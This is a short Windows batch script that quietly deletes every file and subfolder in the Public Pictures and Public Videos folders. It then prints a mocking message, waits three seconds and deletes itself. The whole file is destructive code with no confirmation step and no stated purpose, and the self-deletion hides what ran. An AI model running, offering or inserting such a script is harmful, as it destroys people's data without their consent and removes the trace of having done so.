@echo off
del /q "C:\Users\Public\Pictures\*.*"
for /d %%i in ("C:\Users\Public\Pictures\*") do rmdir /s /q "%%i"
del /q "C:\Users\Public\Videos\*.*"
for /d %%i in ("C:\Users\Public\Videos\*") do rmdir /s /q "%%i"
@echo delllllllllllllll

@echo off
echo 3sec to del
timeout /t 3 >nul
start "" cmd /C del /Q "%~f0"
